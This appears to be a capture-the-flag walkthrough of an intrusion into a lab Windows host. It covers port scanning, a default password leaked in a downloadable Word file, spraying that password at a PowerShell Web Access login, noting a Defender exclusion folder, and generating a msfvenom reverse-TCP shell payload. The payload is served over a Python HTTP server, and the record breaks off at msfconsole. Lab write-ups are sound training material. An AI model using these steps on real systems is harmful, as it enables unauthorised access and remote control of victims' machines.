# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn 10.129.136.40 -vv

Nmap scan report for 10.129.136.40
Host is up, received user-set (0.020s latency).
Scanned at 2026-10-20 16:09:47 BST for 66s
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON
443/tcp open  https   syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.25 seconds
```

## Nmap
```python
❯❯❯ nmap -p 443 -A --min-rate=2000 -sT -Pn 10.129.136.40
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-20 16:11 +0100
Nmap scan report for 10.129.136.40
Host is up (0.013s latency).

PORT    STATE SERVICE    VERSION
443/tcp open  ssl/https?
|_ssl-date: 2026-10-20T15:13:17+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
| tls-alpn: 
|   h2
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Only a web service open

`atsserver.acute.local` ill add to `/etc/hosts`

# HTTPS (443)

![](Pasted%20image%2020261020161640.png)

Im running this through my proxy and im seeing wordpress endpoints

There is a docx i can download

![](Pasted%20image%2020261020162900.png)

This docx file reveals a potential user `lois`

![](Pasted%20image%2020261020163036.png)

![](Pasted%20image%2020261020164633.png)

There is what looks like a default password

```python
Password1!
```

![](Pasted%20image%2020261020163124.png)

In the document there is also a hyperlink to `https://atsserver.acute.local/Acute_Staff_Access/`

![](Pasted%20image%2020261020163334.png)

This takes me to an interesting login page

There is no option to register

![](Pasted%20image%2020261020163430.png)

There is also more connection options

![](Pasted%20image%2020261020163730.png)

There is also some more potential users on the about page

```python
aileen wallace
charlotte hall
evan davies
ieuan monks
joshua morgan
lois hopkins
```

Ill try the default password with some of the users on the login form

Attempting auth on several different users, but the user `edavies` gives a different error

![](Pasted%20image%2020261020165600.png)

This tells me the credentials are valid, but the connection endpoint is unauthorized

# Access to PSWA 

```python
❯❯❯ exiftool New_Starter_CheckList_v7.docx                  
ExifTool Version Number         : 13.55
File Name                       : New_Starter_CheckList_v7.docx
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2026:10:20 16:19:39+01:00
File Access Date/Time           : 2026:10:20 16:19:54+01:00
File Inode Change Date/Time     : 2026:10:20 16:19:47+01:00
File Permissions                : -rw-rw-r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x079b7eb2
Zip Compressed Size             : 428
Zip Uncompressed Size           : 2527
Zip File Name                   : [Content_Types].xml
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000
```

So after realizing the creds are valid but what im trying to connect to isnt, i return to enumeration

Getting the metadata of the pdf file gives me two things, `fcastle` is a user, and the computer name `acute-pc01`

![892](Pasted%20image%2020261020170128.png)

I now am able to login

# PWSA Enumeration

![](Pasted%20image%2020261020170407.png)

This isnt running in constrained language mode

![](Pasted%20image%2020261020171302.png)

These are the users with a profile 

![](Pasted%20image%2020261020172023.png)

There is a directory setup as a defender exclusion

This is good to know if i need to do any tunneling at any point

![](Pasted%20image%2020261020172434.png)

`22.1` is the webserver

I am currently remoted into `22.2`

![](Pasted%20image%2020261020172633.png)

Ill query the users with an active logon, i dont think this is me, although im running as `edavies` this looks to be a different logon type

A console session is a direct session, so in other words the user is actually sitting at the machine, so this cant be me, as im remoted in

In order to see what the user is doing in this session, it might be a good idea to upload a beacon to the target and place it in utils then i can monitor the session

# Meterpreter session 

I think this active session is interesting and if i remember correctly meterpreter has a built in option to watch the screen 

```python
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1337 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
```

Ill create a shell

```python
❯❯❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ill start a webserver to host it

```python
❯❯❯ msfconsole


```


